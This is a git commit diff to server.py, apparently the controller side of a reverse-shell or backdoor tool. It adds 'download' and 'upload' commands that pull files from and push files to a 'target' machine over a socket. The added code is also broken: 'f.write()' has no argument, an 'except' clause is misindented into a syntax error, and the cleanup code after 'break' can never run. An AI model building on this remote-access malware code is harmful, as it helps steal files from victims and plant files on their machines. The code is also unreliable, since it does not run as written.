d615568f11fbd8fe9110a62cb1dceb3eeaf73164
imjustBuck <117772081+imjustBuck@users.noreply.github.com>
2022-11-19 13:31:11 -0500

    Update server.py

--- server.py
+++ server.py
@@ -15,6 +15,24 @@ def reliable_recv():
         except ValueError:
             continue
 
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    target.send(f.read())            
+            
+            
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write()
+        try:
+            chunk = target.recv(1024)
+            except socket.timeout as e:
+                break
+                target.settimeout(None)
+                f.close()
+
 
 def target_communication():
     while True:
@@ -26,6 +44,10 @@ def target_communication():
             os.system('clear')
         elif command[:3] == 'cd ':
             pass
+        elif command[:8] == 'download':
+            download_file(command[9:])
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
         else:
                 result = reliable_recv()
                 print(result)
